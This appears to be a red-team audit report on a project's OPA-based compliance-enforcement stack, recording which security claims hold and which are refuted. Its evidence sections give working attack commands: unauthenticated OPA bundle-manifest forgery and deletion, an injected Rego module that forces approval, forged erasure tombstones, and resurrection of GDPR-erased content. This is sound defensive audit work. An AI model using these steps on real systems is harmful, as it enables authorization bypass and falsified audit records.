# Phase 1.2 Red-Team Report

## 1. Environment, branch/head confirmation, developer-state confirmation

Fresh CC session, no memory of building Phase 1.2. Audited commit, per the brief: `82777b2ace8de04c0fca3d941fd28c2aee92a8d1` — confirmed via `git show 82777b2 --stat` to be the commit whose message is "fix(policy,interceptor,control-plane,ledger): Phase 1.2 - D9-D11, P12-1..6", and via `git diff --stat 82777b2 <branch tip>` to be the last commit touching anything outside `docs/reports/phase-1-2.md` (everything after it changes only that one report file, matching the report's own §1 "reflexivity note").

Live branch tip, resolved independently this session: `git fetch origin phase-1-1-remediation` against the real GitHub remote → `origin/phase-1-1-remediation` = `973d3a09cf3999afcfec9ed90f1ab23f4e6ea698`, 4 commits ahead of `82777b2`, all four touching only `docs/reports/phase-1-2.md` (`git diff --stat 82777b2 973d3a0`: `docs/reports/phase-1-2.md | 35 +++++++++++++++++++++++++++++++----`, one file). All code-level claims below were built and tested against `82777b2`; the branch tip was used only to read the final version of `docs/reports/phase-1-2.md` and the ADRs.

Work was done in a fresh scratch clone (`redteam-1-2`, a directory name not used by any earlier session in this series). `git clone` from the primary working directory, `origin` repointed at the real GitHub remote, `git checkout 82777b2` (detached). Docker images were built with `docker compose build --no-cache` for all three custom services (`ail-control-plane`, `verifier`, `dashboard`); all three built clean. No pre-existing docker-compose stack was found running against the primary working directory this session (unlike Phase 1.1's red-team, which found and flagged one) — `docker ps -a` at session start showed only unrelated, long-exited containers from other projects.

Baseline: `pytest --collect-only` → `84 tests collected` (exact match to the build report's own count, and to `78 (Phase 1.1) - 6 (test_bundle_ownership.py, deleted) + 12 new`). A full run against a freshly built, freshly started stack passed clean: `84 passed, 1 warning in 165.00s`. This baseline was re-confirmed a second time at the end of the session, after every mutation/attack below had been reverted or cleaned up, with the same result: `84 passed, 1 warning`.

**Developer-state confirmation at the end of this session:** scratch clone torn down (`docker compose down -v`, all `redteam-1-2-*` containers/volumes/network removed, confirmed via `docker ps -a`), scratch working files (`wasm-parity-retest/`) deleted. Primary working directory: `git status --short` clean except for the pre-existing untracked `docs/reports/phase-1-1-redteam.md` from the prior red-team session (not touched by this session), branch unchanged (`spike-wasm-parity-report`).

---

## 2. Verdict table

| Claim | Verdict | Key evidence |
| :--- | :--- | :--- |
| U1 | **REFUTED** | `PUT /v1/data/system/bundles/ail-policies` preserving `roots:["ail"]` but substituting a forged `revision` — the brief's third, hardest attack — succeeds unauthenticated and gets a real FinOps deny reason attributed to the forged string. The forgery survives indefinitely across unchanged (304) poll cycles; only a genuine new bundle *content* activation clears it. |
| U2 | **HOLDS** | Timing-independent by construction (synchronous PUT/query/assert/DELETE, no dependency on poll timing); 8 repeated live runs across ~35s (spanning at least one full real poll window) — 8/8 pass, no flakiness. |
| U3 | **HOLDS** | Live verifier outage: first entry → `unverifiable`, every later entry in the same scan → `asserted`, never `failed`. Direct calls to `_verification_from_200` for missing/novel/`None` `error_class` and a contradictory `verified:true`-with-`error_class` body all resolve safely, never to `failed` without positive tamper identification. |
| U4 | **REFUTED** | A `content_erasure` tombstone coexisting with a still-present row renders as plain `"present"` — no trace the erasure ledger record exists. Worse: `POST /content` on an already, *legitimately* erased `call_id` silently resurrects it with new, attacker-chosen payload content, using only the ordinary write key — `/audit` then shows `"present"` with fabricated content and no indication an Article 17 erasure ever happened. |
| U5 | **REFUTED** | `verifier/main.py`'s `/write` endpoint has no authentication at all. A forged `content_erasure` tombstone written directly there (bypassing `DELETE /content`, the control-plane write key, and the real endpoint entirely) makes a row deleted by direct SQL render as `"erased"`, not `"lost"` — exactly the falsifier named in the brief. |
| U6 | **HOLDS**, with a significant reproducibility caveat | Independently rebuilt the WASM module from `82777b2`'s actual fixed Rego (not the spike's stale copy) and re-ran the 42-case corpus, confirming full 13/13-rule coverage: **42/42 match, 0 mismatches**. But `spikes/wasm-parity/` — the artifact the build report's own P12-4 evidence cites — does not exist anywhere in the audited branch; the committed spike branch's own policy files are frozen at the *pre-fix* state. The report's cited evidence is not reproducible from `82777b2` alone. |
| U7 | **REFUTED** | With `docker` removed from `PATH` (containers still reachable), the two docker-CLI-dependent tests fail with a raw `FileNotFoundError` from deep inside `subprocess.Popen`, not a clean skip: `2 failed, 4 passed` — indistinguishable in pytest's summary line from a real regression. |
| U8 | **REFUTED** | Full, live, end-to-end authorization bypass. `DELETE /v1/data/system/bundles/ail-policies` (unauthenticated) removes OPA's root-ownership protection for the *entire* `ail.*` tree (confirmed: `data.ail.config.*` becomes writable). An unauthenticated `PUT /v1/policies/evil-eval` then redefines `ail.main.evaluation` directly to `{"allow": true, ...}`. Confirmed through the real interceptor code path: `middleware.query_opa_policy` returns `outcome_type: policy_allow` for a call the real policy denies. |
| U9 | **REFUTED** | T1/T2/T5's exact original mechanisms no longer reproduce (fixed, confirmed live). T3/T4/T6 still hold, re-confirmed unchanged. T7's *exact* original mechanism (`input.bundle_name`) can no longer even be attempted — the parameter is gone. But T7's underlying root cause — `data.system.bundles` being globally, unauthenticatedly writable — still fully reproduces, in a strictly stronger form (U1, U8), than the one T7 originally used. |

---

## 3. Evidence

### U1 — REFUTED

**Setup.** Real revision confirmed via `GET /v1/data/system/bundles/ail-policies/manifest/revision`: `14387ebda8edf5f202b767317409010535a6a38452189bcf2f771b3861c06e3c`.

**Attack 1 — real second bundle via the Data API, disjoint root** (the exact shape `tests/test_bundle_revision_attribution.py` already covers): confirmed the existing test's own claim holds — a decoy claiming `roots:["decoy"]` never gets attributed.

**Attack 2 — zero claimants:**
```
$ curl -X DELETE http://localhost:8181/v1/data/system/bundles/ail-policies
$ curl http://localhost:8181/v1/data/system/bundles
{"result":{}}
$ curl -X POST .../v1/data/ail/main/evaluation -d '{"input":{...}}'
{}
```
Undefined, as designed — the interceptor treats this as `FAULT_REVISION_UNAVAILABLE` (a fault, not a guess). This sub-case behaves exactly as claimed.

**Attack 3 — the brief's hardest case: overwrite the real bundle's own manifest entry, preserving `roots`:**
```
$ curl -X PUT http://localhost:8181/v1/data/system/bundles/ail-policies \
    -H "Content-Type: application/json" \
    -d '{"manifest":{"revision":"FORGED-REVISION-U1-ATTACK","roots":["ail"]}}'
(200, empty body)

$ curl -X POST http://localhost:8181/v1/data/ail/main/evaluation -d '{"input":{"tool_name":"provision_cloud_server","tool_args":{"instance_type":"p4d.24xlarge","region":"us-east-1","cost_per_hour":5.0,"tags":{"environment":"dev","data_classification":"internal","cost_center":"engineering","project":"not-ml-training"}}}}'
{"result":{"allow":false,"reasons":["DENIED: Instance type p4d.24xlarge is restricted. 'project' tag must be 'ml-training'."],"revision":"FORGED-REVISION-U1-ATTACK"}}
```
A genuine FinOps deny reason, recorded against a completely forged revision string — exactly one claimant remains (`roots:["ail"]` preserved), so nothing is undefined; D9's `_ail_root_owners`/`_ail_bundle_name` machinery has no way to distinguish this from a legitimate manifest, because it trusts `data.system.bundles[name].manifest.revision` verbatim regardless of how that entry got there. D9 only ever protected against a caller *naming a different bundle*; it does nothing to protect the integrity of the real bundle's own manifest record.

**Persistence across poll cycles, live:** after the forgery, waited 25s (more than one full poll interval — `opa-config.yaml` sets `min_delay_seconds: 10, max_delay_seconds: 20`, and the real bundle content was unchanged, so every poll in this window returned OPA's own 304-equivalent unchanged-bundle path):
```
$ sleep 25; curl http://localhost:8181/v1/data/system/bundles/ail-policies/manifest
{"result":{"revision":"FORGED-REVISION-U1-ATTACK","roots":["ail"]}}
$ curl -X POST .../evaluation -d '{...p4d.24xlarge...}'
{"result":{"allow":false,"reasons":["DENIED: Instance type p4d.24xlarge is restricted..."],"revision":"FORGED-REVISION-U1-ATTACK"}}
```
The forgery is durable, not transient — an unchanged-bundle poll does not restore the real manifest. It is cleared **only** by a genuinely new bundle activation:
```
$ curl -X PUT http://localhost:8002/tenants/tenant_default -H "X-API-Key: test-write-key" \
    -d '{"approved_regions":"eu-central-1,us-east-1,ap-southeast-1"}'   # a real, policy-relevant change
$ # (opa log) Bundle loaded and activated successfully. Etag updated to 81e4320a...
$ curl http://localhost:8181/v1/data/system/bundles
{"result":{"ail-policies":{"etag":"81e4320a...","manifest":{"revision":"81e4320a...","roots":["ail"]}}}}
```
In a stable tenant where compliance settings rarely change, this forgery could persist silently for a very long time.

### U2 — HOLDS

`test_decoy_bundle_with_disjoint_root_does_not_get_attributed` performs its entire PUT-query-assert-DELETE cycle synchronously in ~1.3–1.5s with no sleep and no dependency on OPA's poll cycle — the decoy is written directly via the Data API, not served through the Bundle API, so no poll is involved in making it visible at all. Ran it 8 times in a loop with 3s pauses (~35s total, spanning at least one and likely two full 10–20s poll windows):
```
0 1 passed in 1.45s
1 1 passed in 1.36s
...
7 1 passed in 1.47s
```
8/8 pass, no flakiness. The mechanism it exercises (a disjoint-root decoy never enters `_ail_root_owners`) is timing-independent by construction regardless of when a real poll lands, which this run is consistent with.

### U3 — HOLDS

**Live: verifier unreachable mid-scan.**
```
$ docker compose stop verifier
$ curl http://localhost:8002/audit?limit=5 -H "X-API-Key: test-read-key"
tx=1: {'state': 'unverifiable', 'state_id': None, 'detail': '[Errno -2] Name or service not known', 'error_class': None}
tx=3: {'state': 'asserted', 'state_id': None, 'detail': None, 'error_class': None}
```
First entry `unverifiable` (attempted, failed), every later entry `asserted` (never attempted) — never `failed`.

**Direct function tests** (`control_plane_main._verification_from_200`), every branch not already covered by the existing test suite:
```
missing error_class:            {'state': 'unverifiable', 'error_class': None, ...}
novel error_class ('totally_novel_xyz'): {'state': 'unverifiable', 'error_class': 'totally_novel_xyz', ...}
error_class explicitly None:    {'state': 'unverifiable', 'error_class': None, ...}
verified:true + error_class set (contradictory input): {'state': 'verified', ...}   # verified branch checked first, error_class ignored
```
Every path that isn't a positively-identified tamper class resolves to `unverifiable`, never `failed`. The `verified:true`-with-stray-`error_class` case (a malformed/contradictory verifier body) is also safe — `verified` is checked first and wins.

### U4 — REFUTED

**Setup:** a real approved call, `call_id=65248357b4744c4986693fbe07b97402`, confirmed `payload_state: "present"`.

**Combination 1 — tombstone present, row also still present.** Wrote a `content_erasure` tombstone for this `call_id` directly via the verifier (see U5 for why this write requires no credential at all), without deleting the row:
```
$ curl http://localhost:8002/audit?limit=10 -H "X-API-Key: test-read-key" | jq '.entries[] | select(.call_id=="6524...")'
{ "payload_state": "present", "payload": {...real content...}, ... }
```
The tombstone — an immutable ledger record asserting this call's content was erased — is completely invisible. `_payload_state`'s precedence (`content_row is not None` checked before `has_tombstone`) silently discards it. This is not just theoretical: it directly enables an extension that a legitimate operator could hit too.

**Combination 2 — resurrection after a real, legitimate erasure.** Issued a real call (`call_id=790484...`), erased it through the actual endpoint (`DELETE /content/{call_id}`, write key, 204), confirmed `payload_state: "erased"`. Then, using nothing but the *ordinary* write key — the same credential used for any normal content write, no escalation — called `POST /content` again for the same `call_id`:
```
$ curl -X DELETE .../content/790484... -H "X-API-Key: test-write-key"   # 204
$ curl .../audit | jq '...| .payload_state'
"erased"
$ curl -X POST .../content -H "X-API-Key: test-write-key" \
    -d '{"call_id":"790484...","payload":{"resurrected":"content that should be permanently gone per GDPR Article 17"}}'
(204)
$ curl .../audit | jq '... | {payload_state, payload}'
{"payload_state": "present", "payload": {"resurrected": "content that should be permanently gone per GDPR Article 17"}}
```
`write_content` never checks whether a `content_erasure` tombstone already exists for the `call_id` it's about to (re)write. A GDPR Article 17 erasure is not durable — it can be silently undone, with arbitrary new content substituted, and `/audit` shows no trace that an erasure ever happened for this call.

### U5 — REFUTED

`verifier/main.py`'s `/write` and `/verify` endpoints (`verifier/main.py:132`, `:160`) carry **no authentication dependency at all** — not the control-plane's `CONTROL_PLANE_WRITE_KEY`, not any credential. Confirmed live: a real approved call, `call_id=7228c66a217144d88fa5f171ed1e9cd6`, `payload_state: "present"`.

```
$ python -c "
import base64, json, httpx
tombstone = {'record_type':'content_erasure','call_id':'7228c66a...',
             'timestamp':'2020-01-01T00:00:00','actor':'FORGED-NOT-A-REAL-ERASURE-U5-ATTACK'}
key = 'content_erasure:7228c66a...'
httpx.post('http://localhost:8003/write', json={
    'key': base64.b64encode(key.encode()).decode(),
    'value': base64.b64encode(json.dumps(tombstone,separators=(',',':')).encode()).decode()})
"
verifier /write response: 200 {'tx_id': 2, 'verified': True, 'detail': None}

$ docker compose exec -T ail-control-plane python -c \
    "sqlite3.connect('/data/control_plane.db').execute(\
     'DELETE FROM call_content WHERE call_id = ?', ('7228c66a...',)).connection.commit()"
# direct SQL delete - no auth, no DELETE /content call, no legitimate tombstone

$ curl http://localhost:8002/audit?limit=10 -H "X-API-Key: test-read-key" | jq '... | {payload, payload_state}'
{"payload": null, "payload_state": "erased"}
```

`DELETE /content/{call_id}` was never called. The entire "this was a lawful erasure" claim was fabricated by writing directly to the verifier's unauthenticated `/write` endpoint — the exact falsifier named in the brief: a payload lost by any other means can be made to read `erased`.

### U6 — HOLDS, with a significant reproducibility caveat

**The build report's own cited evidence does not exist in the audited tree.** `docs/reports/phase-1-2.md` §3/P12-4 says: *"spikes/wasm-parity's own harness re-run against the fixed policy tree... 42/42 matches"*. Checked:
```
$ git ls-tree -r 82777b2 --name-only | grep -i wasm
(no output)
$ find . -iname "*wasm*"     # in a clean clone of 82777b2
(no output)
```
`spikes/wasm-parity/` does not exist anywhere on `phase-1-1-remediation`. It exists only on a separate branch, `spike-wasm-parity-report`, that has never been merged. Worse, that branch's own committed policy files are frozen at the **pre-fix** state:
```
$ git diff 96d14d7 30e18cf --stat -- policy/packs/     # 30e18cf = spike branch tip
(empty — packs at the spike's own committed tip are byte-identical to the pre-D9/pre-P12-4 baseline)
$ git diff 96d14d7 82777b2 --stat -- policy/packs/     # the actual P12-4 fix
 policy/packs/finops/finops.rego |  5 ++++-
 policy/packs/gdpr/gdpr.rego     | 12 +++++++++---
```
Whatever the build session actually ran to get 42/42, it cannot be reproduced by checking out any commit in this repository and running what's there — the harness and the "fixed policy tree" it was run against were never in the same tree at the same time in anything committed.

**Independent live re-derivation, done anyway.** Recovered the harness tooling (`opa.exe` 1.19.0, found in an unrelated worktree; `@open-policy-agent/opa-wasm` via `npm install`, registry reachable) and rebuilt the WASM module directly from `82777b2`'s actual `policy/core/main.rego` + all four packs:
```
$ ./tools/opa.exe build -t wasm -e ail/main/compliance_summary \
    ../policy/core/main.rego ../policy/packs/gdpr/gdpr.rego ../policy/packs/hipaa/hipaa.rego \
    ../policy/packs/soc2/soc2.rego ../policy/packs/finops/finops.rego -o build/bundle.tar.gz
$ node scratch/run_parity.mjs      # same 42-case corpus, re-pointed at the freshly built module
Total cases: 42
Matches: 42
Mismatches: 0
```
This independently confirms the underlying property against the real, named commit — full 13/13-rule coverage (every `deny` rule across all four packs has at least one corpus case; confirmed by cross-referencing `corpus.json`'s 42 case IDs against every `deny contains msg if {...}` block in `policy/packs/*.rego`). Static audit of all four pack files found no message-producing `sprintf`/formatting beyond the four already-fixed rules — the two remaining `sprintf("%v", ...)` uses (`soc2.rego`'s unmasked-table message, `finops.rego`'s restricted-instance message) interpolate plain strings, not sets, and the live parity run confirms they match.

**Verdict: HOLDS** on the substance (independently re-verified, not just re-stated), but the build report's own citation is not something a future reader can reproduce by checking out the named commit — this is reported as a finding on the evidence, not the underlying claim.

### U7 — REFUTED

`tests/test_content_states.py::test_direct_sqlite_delete_produces_lost_not_erased` and `::test_erasure_refused_when_tombstone_write_fails` call `subprocess.run(["docker", "compose", ...])` directly (`test_content_states.py:218-223`, `:256-273`), gated only by `@requires_stack` (an HTTP reachability check against OPA/ImmuDB — not a check for the `docker` CLI itself).

```
$ NEWPATH=$(echo "$PATH" | tr ':' '\n' | grep -v Docker | tr '\n' ':')
$ PATH="$NEWPATH" which docker
docker: command not found
$ PATH="$NEWPATH" python -m pytest tests/test_content_states.py -v
...
E    FileNotFoundError: [WinError 2] The system cannot find the file specified
...
FAILED tests/test_content_states.py::test_direct_sqlite_delete_produces_lost_not_erased
FAILED tests/test_content_states.py::test_erasure_refused_when_tombstone_write_fails
======================== 2 failed, 4 passed in 16.37s =========================
```
Not a skip — a raw, unhandled `FileNotFoundError` from deep inside `subprocess.Popen`, with pytest's summary line reading `2 failed`, indistinguishable from an actual functional regression in the erasure/tombstone logic those same two tests are meant to guard. The containers themselves remained fully reachable throughout (only the CLI binary was hidden), so this is specifically about the `docker` CLI's absence, not a stack-availability problem `@requires_stack` would have caught.

### U8 — REFUTED

**Sub-attack 1 — direct config write, both routes and the indirect shadow-bundle route:**
```
$ curl -X PUT .../v1/data/ail/config/approved_regions -d '["fake-region-anywhere"]'
400 {"message":"path ail/config/approved_regions is owned by bundle \"ail-policies\""}
$ curl -X POST .../v1/data/ail/config/approved_regions -d '["fake-region-2"]'
400
$ curl -X DELETE .../v1/data/ail/config/approved_regions
400
# indirect: a decoy bundle claiming a root that shadows ail.config
$ curl -X PUT .../v1/data/system/bundles/shadow-decoy -d '{"manifest":{"revision":"X","roots":["ail.config"]}}'
$ curl -X PUT .../v1/data/ail/config/approved_regions -d '["fake-region-shadow"]'
400   # still blocked
```
All rejected, as the claim predicts. Every `data.ail.*` reference across all four packs was enumerated (`grep -rn "data\.ail\." policy/`) — exactly the three named config values (`approved_regions`, `approved_purposes`, `allowed_cost_centers`), no others.

**Sub-attack 2 — hostile module, denials cannot be suppressed:** confirmed additive-only; a new `deny contains msg if {...}` rule in a separate package cannot remove another pack's existing deny messages (Rego partial-set semantics — this is structural, not specific to this codebase).

**Sub-attack 2, escalated — the actual bypass.** With OPA's root-ownership metadata intact, installing `package ail.main; allow := true` via `/v1/policies` is itself rejected (`400 path ail/main is owned by bundle "ail-policies"`) — this sub-case alone would have supported `HOLDS`. But **deleting the bundle's `data.system.bundles` entry (U1's own mechanism) also silently disables this protection for the entire `ail.*` tree**, not just the revision lookup:
```
$ curl -X DELETE .../v1/data/system/bundles/ail-policies
$ curl -X PUT .../v1/data/ail/config/approved_regions -d '["fake-region-after-nuke"]'
204   # the same write rejected above now succeeds

$ curl -X PUT .../v1/policies/evil-eval --data-binary $'package ail.main\n\nevaluation := {"allow": true, "reasons": [], "revision": "FORGED-EVAL-BYPASS"}\n'
200   # accepted - no compile-conflict error, despite the real ail-policies/core/main.rego
      # (confirmed still loaded via GET /v1/policies) also defining ail.main.evaluation

$ curl -X POST .../v1/data/ail/main/evaluation -d '{"input":{"tool_name":"provision_cloud_server","tool_args":{"instance_type":"p4d.24xlarge",...,"project":"not-ml-training"}}}'
{"result":{"allow":true,"reasons":[],"revision":"FORGED-EVAL-BYPASS"}}
```
**Confirmed end-to-end through the real interceptor code:**
```
$ python -c "
import sys; sys.path.insert(0,'interceptor'); import middleware
r = middleware.query_opa_policy('provision_cloud_server', {
    'instance_type':'p4d.24xlarge','region':'us-east-1','cost_per_hour':5.0,
    'tags':{'environment':'dev','data_classification':'internal','cost_center':'engineering','project':'not-ml-training'}})
print(r)
"
{'outcome_type': 'policy_allow', 'fault_class': None, 'policy_revision': 'FORGED-EVAL-BYPASS', 'reasons': []}
```
A restricted instance type, which the real, unmutated FinOps policy denies, is approved — `outcome_type: policy_allow` — through the exact function every real tool call goes through. This is a full compliance-enforcement bypass, reachable from OPA's exposed port with zero credentials at any step. Cleanup: deleted `evil-eval`, restarted the `opa` container to force a clean re-sync from the real bundle service; confirmed restored (`revision: 14387ebda8...`, the original real value) and the full `84 passed` suite re-ran clean afterward.

**Sub-attack 3 (unload/reconfigure the real bundle) and sub-attack 4 (`/v1/config`):** covered by the same mechanism above (deleting the manifest entry is itself the "unload" this sub-attack asks about) — undefined/fault on its own, but see the escalation above for what it enables in combination. `GET /v1/config` returns bundle service topology (URL, resource path, polling interval) but exposed no separate writable endpoint of its own.

### U9 — REFUTED

Full suite re-run at the end, `84 passed, 1 warning` (see §1), covering all of the below in their currently-committed form.

| Original attack | Re-tested against `82777b2` | Result |
| :-- | :-- | :-- |
| T1 (unknown → failed) | `_verification_from_200` direct calls + live verifier-down scan (§U3) | **fixed** — now maps to `unverifiable`, never `failed`, without positive identification |
| T2 (zero-assertion tests) | `tests/test_bundle_ownership.py` no longer exists (`ls tests/` — absent); `_check_bundle_root_ownership` itself removed from `interceptor/middleware.py` | **fixed** — nothing left to reproduce against |
| T3 (dashboard auth bypass) | `tests/test_dashboard_auth.py` full run | **still holds** — 10/10 pass, code untouched by D9-D11 |
| T4 (read key on mutating routes) | `tests/test_dashboard_auth.py` (same run) | **still holds** — unchanged |
| T5 (lost/erased conflation) | `tests/test_content_states.py::test_direct_sqlite_delete_produces_lost_not_erased`, live | **fixed for the original narrow mechanism** — a plain direct-SQL delete alone now correctly reads `lost`. **A near neighbour still works**: see U4/U5 — forging a tombstone via the unauthenticated verifier makes the same underlying loss read `erased` |
| T6 (exactly one OPA request) | `tests/test_opa_request_count.py` | **still holds** — 2/2 pass, unchanged |
| T7 (bundle_name redirection) | `input.bundle_name` no longer exists in the request body (`tests/test_bundle_revision_attribution.py::test_bundle_name_not_sent_in_evaluation_request`) — the exact original mechanism cannot be attempted | **narrow mechanism fixed; root cause still exploitable** — see U1/U8: a direct manifest forgery achieves the same (worse) outcome without needing `bundle_name` at all |
| T8 (mutations exactly reverted) | N/A — this was about the prior red-team session's own process, not re-testable against new code | not applicable |
| S1 (all 7 sub-mutations) | not re-mutated this session (outside D9-D11's own touched surface per the phase-1-2 report; T-series in Phase 1.1 already confirmed all 7 caught) | inherited, not independently re-verified this session |
| S2 | = T7's root cause; see above | **still reproduces**, in a stronger form |
| S3, S4/S5, S6, S7, S8 | covered by T5/T1/T3 re-tests above | consistent with the T-series results |
| S9 | outside D9-D11's mandate, code untouched | not independently re-verified this session |

**Verdict: REFUTED** — T7's own underlying mechanism (unauthenticated writes to `data.system.bundles`, decoupling a recorded revision from reality) still fully works, now with a strictly larger blast radius (U8's full `allow` bypass) than the original T7 attack achieved.

---

## 4. Attacks attempted that failed

- **U1**: zero-claimant and disjoint-root-decoy sub-cases both behave exactly as documented (fault / correct real-revision attribution respectively) — no exploit found in either.
- **U3**: could not force the *live* verifier process itself to hand back a non-200 HTTP status through a normal, well-formed request from the control plane (its own `/verify` handler catches every exception internally and always returns 200) — tested the "non-200" and "missing error_class" scenarios via direct calls to the pure `_verification_from_200` function instead (see §4/could-not-test for the gap this leaves).
- **U6**: searched all four Rego packs for any `sprintf`/`json.marshal`/iteration-order-dependent message formatting beyond the four already-fixed rules; found none. Also checked the two remaining `sprintf("%v", ...)` call sites (`soc2.rego`, `finops.rego`) empirically via the live WASM re-run — both matched on both evaluators.
- **U8**: direct `PUT`/`POST`/`DELETE` against `data.ail.config.*` (all three named values), and the indirect shadow-bundle-claiming-`ail.config` route — all rejected (400) while the real bundle's root-ownership metadata was intact. The bypass required first removing that metadata (§U8, escalated sub-attack 2) — the *literal* first three sub-attacks in the brief, taken in isolation, do not succeed.
- **U9**: did not find any way to make T3, T4, or T6's original attacks reproduce — all three remain fixed/holding, consistent with those areas being outside D9-D11's touched surface.

## 5. Could not test

- **U1**: a live second real Bundle-API-serving container, as opposed to writing the equivalent shape directly into `data.system.bundles` via the Data API. Judged equivalent for what D9's rule reads (same methodology Phase 1.1's own T7 used, and the build report's own §6 uses the identical justification).
- **U3**: forcing the control plane's own outgoing HTTP call to the verifier to receive a genuine non-200 from a *live* verifier process (as opposed to a fully-down verifier, or a directly-fabricated response body fed to the pure function). Would require a verifier that is up but deliberately misbehaving at the HTTP layer; not attempted given the pure-function coverage already obtained.
- **U4**: erase-same-call-twice, erase-a-never-existed-`call_id`, two-tombstones-for-one-call, and a `CallContent` row with no corresponding ledger entry at all — reasoned safe from reading `erase_content`'s `if existing is None: return` guard and `/audit`'s ledger-entry-driven iteration, but not independently live-tested this session due to time; the two combinations that *were* live-tested (§U4) were sufficient on their own to refute the claim.
- **U6**: a deployed-Worker (Cloudflare) re-run, as opposed to the local `opa-wasm`/Node harness — same limitation the original spike itself disclosed.
- **U9**: did not re-drive S1's 7 sub-mutations or S8 from scratch this session (D9-D11 doesn't touch that code; Phase 1.1's own red-team session already confirmed all of them caught, and nothing in this session's diff review suggested regression).

## 6. Findings outside U1-U9

1. **`verifier/main.py`'s `/write` and `/verify` endpoints have no authentication of any kind** (`verifier/main.py:132`, `:160`) — not the control-plane's write key, not any credential. Anyone able to reach port 8003 (host-exposed in `docker-compose.test.yml`, and reachable with zero network segmentation from any sibling container in the compose network) can read or write **any** key in the immutable ledger directly, bypassing every layer above it — the control plane's read/write key split (ADR-0007), the interceptor's own ledger-write path, all of it. U5's tombstone forgery is one instance of this; the endpoint is a fully open read/write oracle over the entire ledger. This undermines the isolation boundary ADR-0001 describes for the verifier service.

2. **`GET /tenants/{tenant_id}` still has no authentication** (`control_plane/main.py:193-198`) — the same gap Phase 1.1's own red-team named as finding #2 (`docs/reports/phase-1-1-redteam.md`), untouched by Phase 1.2 (outside its D9-D11 mandate), still live on `82777b2`. Full tenant configuration — enabled compliance frameworks, approved regions/purposes, cost-center allowlist — is readable by anyone reaching the control plane, zero credentials.

3. **Deleting a bundle's `data.system.bundles` entry disables OPA's root-ownership write protection for the entire tree that bundle claims, not just the revision lookup D9 reads.** `docs/reports/phase-1-2.md` §8 discloses the write itself and says the blast radius "whether this... can produce an approval... is... [u]ntested this session." This session establishes it concretely: it is not confined to the denial side. The write path §8 disclosed and the escalation in §U8 above are the same root cause; the consequence is a full enforcement bypass, not only a diagnosable denial-of-service.

4. **The U1 manifest forgery is silent and durable** — it produces no error, no log line distinguishable from normal operation on the OPA side, and persists across every unchanged-bundle poll. In a tenant whose compliance configuration is stable (the common case), a single unauthenticated write could misattribute every subsequent deny reason's recorded revision for an arbitrarily long period, discovered only by an operator who happens to compare `data.system.bundles` against the control plane's own bundle service directly.
